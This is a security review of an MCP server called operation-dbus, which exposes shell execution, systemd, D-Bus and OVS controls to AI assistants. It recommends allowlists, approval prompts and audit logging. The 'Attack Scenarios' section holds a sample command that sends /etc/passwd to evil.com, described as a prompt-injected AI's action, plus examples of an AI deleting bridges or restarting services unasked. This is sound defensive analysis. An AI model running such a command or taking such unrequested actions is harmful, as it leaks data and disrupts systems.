# MCP Tool Exposure Analysis: How Linux Commands Appear in AI Assistants

## Overview
This document explains how the operation-dbus MCP server exposes Linux system commands as tools that appear in AI assistant interfaces (like the screenshot showing the tools menu in Cursor/Claude).

## How MCP Tools Appear in AI Interfaces

### What You're Seeing in the Screenshot
The menu showing at the top of your IDE is the **MCP Tools** interface, which displays:
- Files from the project (`install.sh`, `ovsdb_jsonrpc.rs`)
- MCP tool categories ("Files and Folders", "Docs", "Terminals", etc.)
- Browser and system integration options

This interface is powered by the MCP server exposing system operations through a standardized protocol.

## MCP Architecture in operation-dbus

### 1. Tool Registry System (`src/mcp/tool_registry.rs`)

The tool registry dynamically manages what gets exposed to AI assistants:

```rust
pub trait Tool: Send + Sync {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    fn input_schema(&self) -> Value;
    async fn execute(&self, params: Value) -> Result<ToolResult>;
}
```

**Tools Currently Exposed** (from `web_bridge.rs` line 506):
- `execute_command` - Execute arbitrary shell commands
- `manage_systemd_service` - Control systemd units
- `query_dbus_service` - Query D-Bus services
- `spawn_agent` - Create new MCP agents
- `list_agents` - List running agents
- `dbus_introspect` - Introspect D-Bus interfaces

### 2. Discovery System (`src/mcp/discovery.rs`)

Automatically discovers and exposes D-Bus services:

```rust
// Well-known services exposed to MCP
let targets = vec![
    "org.freedesktop.systemd1",      // systemd control
    "org.freedesktop.NetworkManager", // network management
    "org.freedesktop.login1",         // login/session management
];
```

**How It Works:**
1. Scans D-Bus for available services
2. Introspects each service to find methods
3. Generates MCP tool configurations
4. Writes configs to `/tmp/mcp-servers/*.json`
5. AI assistants load these configs and present them as tools

### 3. Network Agent (`src/mcp/agents/network.rs`)

**Current Implementation (INSECURE - Uses CLI):**

```rust
fn list_interfaces(&self) -> Result<String, String> {
    let output = Command::new("ip").arg("addr").output(); // ⚠️ CLI EXECUTION
    // ...
}

fn list_connections(&self) -> Result<String, String> {
    let output = Command::new("ss").arg("-tuln").output(); // ⚠️ CLI EXECUTION
    // ...
}

fn show_routes(&self) -> Result<String, String> {
    let output = Command::new("ip").arg("route").output(); // ⚠️ CLI EXECUTION
    // ...
}
```

**Operations Exposed:**
- `ping` - Network connectivity testing
- `interfaces` - List network interfaces
- `connections` - Show active connections
- `ports` - List open ports
- `route` - Display routing table
- `dns` - Check DNS configuration

### 4. Web Bridge (`src/mcp/web_bridge.rs`)

Provides HTTP/WebSocket interface for remote AI access:

**Endpoints:**
- `/api/tools` - List available tools
- `/api/tools/:name` - Execute specific tool
- `/api/discovery/run` - Run D-Bus discovery
- `/api/discovery/services` - List discovered services
- `/ws/mcp` - WebSocket for real-time MCP protocol
- `/ws/events` - Event streaming

## Security Implications for AI Exposure

### Current Security Posture: 🔴 CRITICAL

When an AI assistant loads the operation-dbus MCP server, it gains access to:

1. **Arbitrary Command Execution**
   ```rust
   // From network agent - DANGEROUS
   Command::new("ping").arg(target).output()
   ```
   - AI can execute shell commands
   - No input sanitization
   - No command whitelisting
   - Potential for command injection

2. **System-Wide Service Access**
   ```rust
   // Discovery exposes ALL D-Bus services
   for service_name in targets {
       // systemd1, NetworkManager, login1, etc.
   }
   ```
   - Full systemd control (start/stop/restart services)
   - Network configuration changes
   - User session manipulation

3. **OVS Bridge Management**
   - Create/delete bridges
   - Modify network topology
   - Change flow rules
   - Affect production traffic

### Attack Scenarios

**Scenario 1: Malicious Prompt Injection**
```
User: "Can you check network connectivity?"
Malicious AI: *executes* ping -c 1 evil.com && curl evil.com/exfiltrate?data=$(cat /etc/passwd)
```

**Scenario 2: Unintended Bridge Deletion**
```
User: "Clean up old bridges"
AI: *deletes production bridge* causing network outage
```

**Scenario 3: Service Manipulation**
```
User: "Why is the service slow?"
AI: *restarts critical service* causing downtime
```

## Recommended Secure Architecture

### Phase 1: Replace CLI with D-Bus/JSON-RPC

**Network Operations:**
```rust
// BEFORE (CLI - INSECURE)
fn list_interfaces(&self) -> Result<String, String> {
    Command::new("ip").arg("addr").output()
}

// AFTER (D-Bus - SECURE)
async fn list_interfaces_dbus(&self) -> Result<Vec<InterfaceInfo>> {
    let conn = Connection::system().await?;
    let proxy = NetworkManagerProxy::new(&conn).await?;
    proxy.get_all_devices().await
}
```

**OVS Operations:**
```rust
// BEFORE (CLI - INSECURE)
Command::new("ovs-vsctl").arg("add-br").arg(bridge_name).output()

// AFTER (OVSDB JSON-RPC - SECURE)
async fn create_bridge_rpc(&self, bridge_name: &str) -> Result<()> {
    let client = OvsdbClient::new();
    client.create_bridge(bridge_name).await
}
```

### Phase 2: Operation Whitelisting

```rust
// Define allowed operations explicitly
#[derive(Debug, Serialize, Deserialize)]
enum AllowedNetworkOperation {
    ListInterfaces,       // Read-only
    PingHost { host: String, count: u8 }, // Limited params
    GetRoutes,            // Read-only
    // Destructive operations NOT exposed to AI
}

async fn execute_network_operation(op: AllowedNetworkOperation) -> Result<ToolResult> {
    match op {
        AllowedNetworkOperation::ListInterfaces => {
            // Safe read-only operation
        }
        // No CreateBridge, DeleteBridge, etc.
    }
}
```

### Phase 3: Permission Model

```rust
pub struct ToolPermissions {
    pub read_only: bool,
    pub requires_approval: bool,
    pub allowed_resources: Vec<String>,
}

impl Tool for NetworkTool {
    fn permissions(&self) -> ToolPermissions {
        ToolPermissions {
            read_only: true,  // No write operations
            requires_approval: false, // Safe for AI
            allowed_resources: vec!["network".to_string()],
        }
    }
}
```

### Phase 4: Audit and Rate Limiting

```rust
pub struct AuditMiddleware {
    audit_log: Arc<RwLock<Vec<AuditEntry>>>,
}

#[async_trait]
impl ToolMiddleware for AuditMiddleware {
    async fn before_execute(&self, tool_name: &str, params: &Value) -> Result<()> {
        // Log all AI-initiated operations
        self.audit_log.write().await.push(AuditEntry {
            timestamp: Utc::now(),
            tool: tool_name.to_string(),
            params: params.clone(),
            source: "ai-assistant",
        });
        Ok(())
    }
}
```

## MCP Tool Configuration Example

What gets exposed to AI assistants via MCP config:

```json
{
  "mcpServers": {
    "operation-dbus": {
      "command": "./target/debug/op-dbus",
      "args": ["mcp-server"],
      "env": {
        "DBUS_SERVICE": "org.opdbus.MCP",
        "MCP_NAME": "operation-dbus"
      }
    },
    "systemd-control": {
      "command": "./target/debug/dbus-mcp-bridge",
      "args": ["--service", "org.freedesktop.systemd1"],
      "env": {
        "DBUS_SERVICE": "org.freedesktop.systemd1",
        "MCP_NAME": "systemd"
      }
    }
  }
}
```

## Immediate Actions Required

### 1. Audit Current Tool Exposure
```bash
# List all tools currently exposed to AI
curl http://localhost:8080/api/tools

# Check what D-Bus services are discoverable
curl http://localhost:8080/api/discovery/services
```

### 2. Implement Read-Only Mode
```rust
// Add to tool registry
pub enum ToolAccessLevel {
    ReadOnly,      // Safe for AI - queries only
    WriteNeedsApproval, // Requires human approval
    AdminOnly,     // Never exposed to AI
}
```

### 3. Replace CLI Commands
Priority order:
1. Network agent: Replace `ip`, `ss`, `ping` with D-Bus
2. Systemd agent: Use `org.freedesktop.systemd1` directly
3. OVS operations: Use OVSDB JSON-RPC exclusively

### 4. Add User Confirmation for Destructive Ops
```rust
async fn execute_tool(&self, name: &str, params: Value) -> Result<ToolResult> {
    let tool = self.get_tool(name).await?;
    
    if tool.is_destructive() {
        // Prompt user for confirmation
        // AI cannot proceed without approval
        return Err(anyhow!("Operation requires user confirmation"));
    }
    
    tool.execute(params).await
}
```

## Conclusion

The current MCP implementation exposes significant system control to AI assistants through:
1. Direct CLI command execution
2. Unrestricted D-Bus service access
3. OVS bridge management capabilities

**Critical Security Recommendations:**
1. ✅ Replace ALL CLI commands with D-Bus/JSON-RPC
2. ✅ Implement operation whitelisting (read-only by default)
3. ✅ Add permission model (separate read/write/admin)
4. ✅ Require user approval for destructive operations
5. ✅ Add comprehensive audit logging
6. ✅ Implement rate limiting to prevent abuse

**Immediate Next Steps:**
1. Add `read_only: true` flag to all current tools
2. Refactor network agent to use D-Bus
3. Create operation whitelist enum
4. Implement user confirmation prompts for MCP

The goal is to make the MCP server safe for AI assistant use while maintaining full functionality through secure, controlled APIs.
